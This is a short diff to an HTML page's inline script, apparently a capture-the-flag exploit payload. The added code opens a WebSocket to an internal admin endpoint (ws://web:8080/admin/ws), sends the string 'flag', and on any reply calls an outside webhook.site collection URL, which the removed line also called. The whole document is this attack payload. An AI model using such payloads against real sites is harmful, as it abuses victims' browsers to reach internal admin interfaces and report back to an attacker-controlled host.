@@ -4,7 +4,15 @@
 </head>
 <body>
   <script>
-      fetch(`https://webhook.site/19995222-48eb-4a16-9239-6fd4fb51f9f6`);
+      const ws = new WebSocket(`ws://web:8080/admin/ws`);
+  
+      ws.onopen = () => {
+        ws.send(`flag`);
+      };
+
+      ws.onmessage = (event) => {
+        fetch(`https://webhook.site/19995222-48eb-4a16-9239-6fd4fb51f9f6`);
+      };
   </script>
 </body>
 </html>
